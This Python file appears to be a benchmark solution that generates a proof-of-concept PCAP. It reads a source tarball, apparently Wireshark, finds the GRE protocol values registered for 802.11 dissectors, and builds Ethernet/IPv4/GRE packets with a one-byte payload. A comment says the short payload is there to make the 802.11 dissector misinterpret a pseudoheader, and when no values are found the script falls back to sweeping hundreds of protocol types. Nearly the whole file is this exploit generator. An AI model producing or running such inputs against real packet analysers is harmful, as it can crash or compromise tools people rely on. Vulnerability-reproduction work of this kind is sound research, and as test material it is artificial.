import os
import re
import tarfile
import tempfile
import struct


def _read_text_safe(path, max_bytes=2_000_000):
    try:
        with open(path, 'rb') as f:
            data = f.read(max_bytes + 1)
        if len(data) > max_bytes:
            data = data[:max_bytes]
        try:
            return data.decode('utf-8', errors='ignore')
        except Exception:
            return ""
    except Exception:
        return ""


def _gather_defines(root):
    defines = {}
    define_re = re.compile(r'^\s*#\s*define\s+([A-Za-z_]\w*)\s+(.+)$', re.M)
    # Capture numeric hex or decimal constants
    num_re = re.compile(r'^(0x[0-9A-Fa-f]+|\d+)(?:[uUlL]*)\b')
    # Keep it simple: only direct numeric defines, no expressions
    for dirpath, _, filenames in os.walk(root):
        for fn in filenames:
            if not fn.lower().endswith(('.h', '.c', '.hpp', '.hh', '.cc', '.cpp', '.ipp')):
                continue
            content = _read_text_safe(os.path.join(dirpath, fn))
            for m in define_re.finditer(content):
                name = m.group(1)
                val = m.group(2).strip()
                nm = num_re.match(val)
                if nm:
                    token = nm.group(1)
                    try:
                        if token.lower().startswith('0x'):
                            defines[name] = int(token, 16)
                        else:
                            defines[name] = int(token, 10)
                    except Exception:
                        pass
    return defines


def _parse_proto_values_from_source(root):
    # Find occurrences of: dissector_add_uint("gre.proto", <expr>, <handle>)
    gre_add_re = re.compile(r'dissector_add_uint\s*\(\s*"gre\.proto"\s*,\s*([^\),]+)\s*,\s*([^\),]+)\s*\)', re.S)
    values = []
    candidates_with_handles = []
    for dirpath, _, filenames in os.walk(root):
        for fn in filenames:
            if not fn.lower().endswith(('.c', '.cc', '.cpp', '.h', '.hh', '.hpp')):
                continue
            path = os.path.join(dirpath, fn)
            content = _read_text_safe(path)
            for m in gre_add_re.finditer(content):
                expr = m.group(1).strip()
                handle = m.group(2).strip()
                candidates_with_handles.append((expr, handle))
    # Try to prioritize wlan/ieee80211 handles
    priority = []
    others = []
    for expr, handle in candidates_with_handles:
        h = handle.lower()
        if 'wlan' in h or '80211' in h or 'ieee80211' in h or 'ieee_802_11' in h:
            priority.append((expr, handle))
        else:
            others.append((expr, handle))
    defines = _gather_defines(root)

    def eval_expr(expr):
        e = expr.strip()
        # Strip enclosing parentheses
        while e.startswith('(') and e.endswith(')'):
            e = e[1:-1].strip()
        # Remove casts (e.g., (guint16)0x1234)
        e = re.sub(r'\([^\)]*\)', '', e).strip()
        # Simple numeric?
        if re.fullmatch(r'0x[0-9A-Fa-f]+', e):
            try:
                return int(e, 16)
            except Exception:
                return None
        if re.fullmatch(r'\d+', e):
            try:
                return int(e, 10)
            except Exception:
                return None
        # If it's a macro or name, try look-up
        token = re.match(r'^[A-Za-z_]\w*$', e)
        if token:
            name = token.group(0)
            if name in defines:
                return defines[name]
        # Very simple binary OR of names or nums
        parts = re.split(r'\s*\|\s*', e)
        if len(parts) > 1:
            val = 0
            for p in parts:
                pv = eval_expr(p)
                if pv is None:
                    return None
                val |= pv
            return val
        return None

    out = []
    for expr, handle in priority + others:
        v = eval_expr(expr)
        if isinstance(v, int):
            out.append((v, handle))
    # Return numeric values; duplicates removed, prioritize ones with wlan-like handles
    seen = set()
    vals = []
    for v, _ in out:
        if v not in seen and 0 <= v <= 0xFFFF:
            seen.add(v)
            vals.append(v)
    return vals, [v for v, h in out if ('wlan' in h.lower() or '80211' in h.lower() or 'ieee80211' in h.lower() or 'ieee_802_11' in h.lower())]


def _ipv4_checksum(hdr_bytes):
    # hdr_bytes length should be even
    if len(hdr_bytes) % 2 == 1:
        hdr_bytes += b'\x00'
    total = 0
    for i in range(0, len(hdr_bytes), 2):
        word = (hdr_bytes[i] << 8) + hdr_bytes[i+1]
        total += word
        total = (total & 0xFFFF) + (total >> 16)
    checksum = (~total) & 0xFFFF
    return checksum


def _build_eth_ip_gre_packet(gre_proto_type, gre_payload=b'\x00'):
    # Ethernet header: dst 00:00:00:00:00:00, src 00:00:00:00:00:01, type IPv4 (0x0800)
    eth = b'\x00'*6 + b'\x00'*5 + b'\x01' + b'\x08\x00'
    # IPv4 header
    version_ihl = 0x45
    dscp_ecn = 0
    ip_payload_len = 4 + len(gre_payload)  # GRE header + payload
    total_length = 20 + ip_payload_len
    identification = 0
    flags_frag = 0
    ttl = 64
    protocol = 47  # GRE
    checksum = 0
    src_ip = struct.pack('!BBBB', 1, 2, 3, 4)
    dst_ip = struct.pack('!BBBB', 5, 6, 7, 8)
    ip_hdr_wo_checksum = struct.pack('!BBHHHBBH4s4s',
                                     version_ihl, dscp_ecn, total_length, identification,
                                     flags_frag, ttl, protocol, checksum, src_ip, dst_ip)
    checksum = _ipv4_checksum(ip_hdr_wo_checksum)
    ip_hdr = struct.pack('!BBHHHBBH4s4s',
                         version_ihl, dscp_ecn, total_length, identification,
                         flags_frag, ttl, protocol, checksum, src_ip, dst_ip)
    # GRE header: flags+version (0x0000), protocol type
    gre_hdr = struct.pack('!HH', 0x0000, gre_proto_type & 0xFFFF)
    return eth + ip_hdr + gre_hdr + gre_payload


def _build_pcap(packets):
    # pcap global header (little-endian)
    gh = struct.pack('<IHHIIII',
                     0xA1B2C3D4,  # magic (little-endian signature when read LE)
                     2, 4,        # version
                     0,           # thiszone
                     0,           # sigfigs
                     262144,      # snaplen (256KiB)
                     1)           # network = Ethernet
    records = []
    for pkt in packets:
        ts_sec = 0
        ts_usec = 0
        incl_len = len(pkt)
        orig_len = len(pkt)
        ph = struct.pack('<IIII', ts_sec, ts_usec, incl_len, orig_len)
        records.append(ph + pkt)
    return gh + b''.join(records)


class Solution:
    def solve(self, src_path: str) -> bytes:
        # Attempt to extract GRE->802.11 proto type(s) from source if available
        tmpdir = None
        proto_values = []
        wlan_related_values = []

        try:
            tmpdir = tempfile.mkdtemp(prefix='pocsrc_')
            try:
                with tarfile.open(src_path, 'r:*') as tf:
                    tf.extractall(tmpdir)
            except Exception:
                # If not a tarball, fallback to treat src_path as directory
                if os.path.isdir(src_path):
                    tmpdir = src_path
                else:
                    tmpdir = None
            if tmpdir and os.path.isdir(tmpdir):
                values_all, wlan_vals = _parse_proto_values_from_source(tmpdir)
                wlan_related_values = wlan_vals
                # If we found WLAN-specific, prioritize them
                if wlan_related_values:
                    proto_values.extend(wlan_related_values)
                # Add the rest
                for v in values_all:
                    if v not in proto_values:
                        proto_values.append(v)
        except Exception:
            pass

        # If we couldn't find proto values, fallback to a broad set of candidates.
        # Include likely and low-range values.
        if not proto_values:
            fallback = []
            likely = [
                0x0019,  # guess
                0x0001, 0x0002, 0x0003, 0x0007,
                0x6558,  # Transparent Ethernet bridging
                0x88BB,  # guessed vendor-specific
                0x88B5,  # 802.1 local experimental
                0x8137,  # IPX
                0x86DD,  # IPv6 (unlikely but harmless)
                0x0800,  # IPv4
                0x0806,  # ARP
                0x8100,  # 802.1Q VLAN
                0x8863, 0x8864,  # PPPoE Discovery/Session
                0x8847,  # MPLS unicast
                0x8848,  # MPLS multicast
            ]
            # Add a low range sweep 0..0x00FF
            sweep_low = list(range(0x0000, 0x0100))
            fallback.extend(likely + sweep_low)
            # Deduplicate and cap length to keep file size reasonable
            seen = set()
            for v in fallback:
                if 0 <= v <= 0xFFFF and v not in seen:
                    seen.add(v)
                    proto_values.append(v)
                    if len(proto_values) >= 512:
                        break  # cap to 512 packets to keep size small

        # If we obtained a lot of values from source, cap to avoid huge file
        if len(proto_values) > 1024:
            proto_values = proto_values[:1024]

        # Build packets
        packets = []
        # Small GRE payload to ensure 802.11 dissector will try to use pseudoheader and misinterpret
        gre_payload = b'\x00'
        # If we found WLAN-specific values from source, build these first
        preferred_values = []
        if wlan_related_values:
            for v in wlan_related_values:
                if v not in preferred_values:
                    preferred_values.append(v)
        for v in preferred_values:
            pkt = _build_eth_ip_gre_packet(v, gre_payload)
            packets.append(pkt)
        # Then add the other candidate values
        for v in proto_values:
            if v in preferred_values:
                continue
            pkt = _build_eth_ip_gre_packet(v, gre_payload)
            packets.append(pkt)

        # Assemble PCAP
        pcap_bytes = _build_pcap(packets)
        return pcap_bytes